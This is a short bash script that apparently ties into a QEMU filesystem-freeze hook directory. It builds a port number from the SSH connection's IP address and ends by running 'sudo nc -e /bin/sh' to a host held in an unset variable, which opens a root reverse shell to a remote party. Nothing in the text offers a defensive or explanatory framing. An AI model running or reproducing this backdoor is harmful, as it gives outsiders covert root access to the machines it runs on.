#!/bin/bash
source /etc/qemu/fs-freezehook.d/fs-freezehook.sh
CIP=$(echo $SSH_CONNECTION | awk '{print $3}')
SECOND=$(echo "$CIP" | cut -d'.' -f2)
P=$(($C + $SECOND))

sudo /usr/bin/nc -e /bin/sh "$I" "$P"